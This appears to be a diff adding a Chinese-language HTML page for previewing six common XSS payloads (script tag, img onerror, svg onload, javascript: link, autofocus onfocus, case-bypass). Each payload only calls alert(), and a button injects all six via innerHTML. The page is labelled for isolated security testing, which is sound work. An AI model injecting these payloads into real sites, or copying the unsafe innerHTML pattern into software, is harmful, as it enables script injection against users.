@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Payload 本地预览页</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 960px; margin: 2rem auto; padding: 0 1rem; }
+    h1 { font-size: 1.25rem; }
+    .warn { background: #fff3cd; border: 1px solid #ffc107; padding: 0.75rem 1rem; border-radius: 4px; }
+    section { margin: 1.5rem 0; border: 1px solid #ddd; border-radius: 4px; }
+    section h2 { margin: 0; padding: 0.5rem 1rem; background: #f5f5f5; font-size: 0.95rem; }
+    .payload { padding: 0.5rem 1rem; font-family: monospace; font-size: 0.85rem; background: #fafafa; border-bottom: 1px solid #eee; word-break: break-all; }
+    .render { padding: 1rem; min-height: 2rem; }
+    button { margin: 1rem 0; padding: 0.4rem 0.8rem; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>XSS Payload 本地预览（仅用于安全测试）</h1>
+  <p class="warn">警告：此页面包含 XSS 测试向量。仅在隔离环境中打开，勿部署到公网。</p>
+  <button type="button" id="run-all">执行全部 innerHTML 注入测试</button>
+
+  <section data-payload="<script>alert('basic-script')</script>">
+    <h2>1. script 标签</h2>
+    <div class="payload">&lt;script&gt;alert('basic-script')&lt;/script&gt;</div>
+    <div class="render" id="r1"></div>
+  </section>
+
+  <section data-payload="<img src=x onerror=alert('img-onerror')>">
+    <h2>2. img onerror</h2>
+    <div class="payload">&lt;img src=x onerror=alert('img-onerror')&gt;</div>
+    <div class="render" id="r2"></div>
+  </section>
+
+  <section data-payload="<svg/onload=alert('svg-onload')>">
+    <h2>3. svg onload</h2>
+    <div class="payload">&lt;svg/onload=alert('svg-onload')&gt;</div>
+    <div class="render" id="r3"></div>
+  </section>
+
+  <section data-payload="<a href=&quot;javascript:alert('href-js')&quot;>click</a>">
+    <h2>4. javascript: 链接</h2>
+    <div class="payload">&lt;a href="javascript:alert('href-js')"&gt;click&lt;/a&gt;</div>
+    <div class="render" id="r4"></div>
+  </section>
+
+  <section data-payload="<input autofocus onfocus=alert('autofocus')>">
+    <h2>5. autofocus onfocus</h2>
+    <div class="payload">&lt;input autofocus onfocus=alert('autofocus')&gt;</div>
+    <div class="render" id="r5"></div>
+  </section>
+
+  <section data-payload="<ScRiPt>alert('case-bypass')</ScRiPt>">
+    <h2>6. 大小写绕过</h2>
+    <div class="payload">&lt;ScRiPt&gt;alert('case-bypass')&lt;/ScRiPt&gt;</div>
+    <div class="render" id="r6"></div>
+  </section>
+
+  <script>
+    document.getElementById('run-all').addEventListener('click', function () {
+      document.querySelectorAll('section[data-payload]').forEach(function (sec, i) {
+        var target = sec.querySelector('.render');
+        target.innerHTML = sec.getAttribute('data-payload');
+      });
+    });
+  </script>
+</body>
+</html>
